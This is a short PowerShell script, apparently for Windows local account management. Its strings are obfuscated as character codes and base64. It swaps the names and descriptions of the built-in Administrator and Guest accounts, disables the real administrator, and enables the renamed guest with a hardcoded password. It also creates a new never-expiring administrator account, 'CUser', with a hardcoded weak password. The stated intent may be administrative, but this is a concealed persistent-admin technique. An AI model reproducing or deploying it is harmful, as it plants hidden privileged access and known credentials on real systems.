<#
Author: Adam Eaddy
Version: 1.0
Edited by: 
Date Created: 16/04/2024
Date Updated: 
#>

$UA1 = [string][char[]][int[]]("67.85.115.101.114".Split(".")) -replace " "
$UA2 = [string][char[]][int[]]("65.100.109.105.110.105.115.116.114.97.116.111.114".Split(".")) -replace " "
$UA3 = [string][char[]][int[]]("71.117.101.115.116".Split(".")) -replace " "
$UA4 = [string][char[]][int[]]("67.72.79.65.97.100.109.105.110".Split(".")) -replace " "
$UG1 = [string][char[]][int[]]("65.100.109.105.110.105.115.116.114.97.116.111.114.115".Split(".")) -replace " "
$US1 = [string][char[]][int[]]("103.80.97.115.115.119.111.114.100.49.33".Split(".")) -replace " "
$US2 = [string][char[]][int[]]("99.80.97.115.115.119.111.114.100.49.33".Split(".")) -replace " "
$DS1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QgB1AGkAbAB0AC0AaQBuACAAYQBjAGMAbwB1AG4AdAAgAGYAbwByACAAZwB1AGUAcwB0ACAAYQBjAGMAZQBzAHMAIAB0AG8AIABjAG8AbQBwAHUAdABlAHIA'))
$DS2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QgB1AGkAbAB0AC0AaQBuACAAYQBjAGMAbwB1AG4AdAAgAGYAbwByACAAYQBkAG0AaQBuAGkAcwB0AGUAcgBpAG4AZwAgAHQAaABlACAAYwBvAG0AcAB1AHQAZQByAA=='))
$AA1 = glu -Name $UA2
$AG1 = glu -Name $UA3
rnlu -InputObject $AG1 -NewName $UA4
rnlu -InputObject $AA1 -NewName $UA3
$AA1 = glu -Name $UA3
$AG1 = glu -Name $UA4
$nAP1 = [System.Guid]::NewGuid().ToString()
$nAP1s = ConvertTo-SecureString $nAP1 -AsPlainText -Force
slu -InputObject $AA1 -Password $nAP1s
elu -InputObject $AG1
$gP1 = ConvertTo-SecureString $US1 -AsPlainText -Force
slu -InputObject $AG1 -Password $gP1
dlu -InputObject $AA1
slu -InputObject $AA1 -Description $DS1
slu -InputObject $AG1 -Description $DS2
$cP1 = ConvertTo-SecureString $US2 -AsPlainText -Force
nlu -Name $UA1 -Password $cP1 -AccountNeverExpires
$nW = glu -Name $UA1
slu -InputObject $nW -AccountNeverExpires -PasswordNeverExpires $true
algm -Group $UG1 -Member $UA1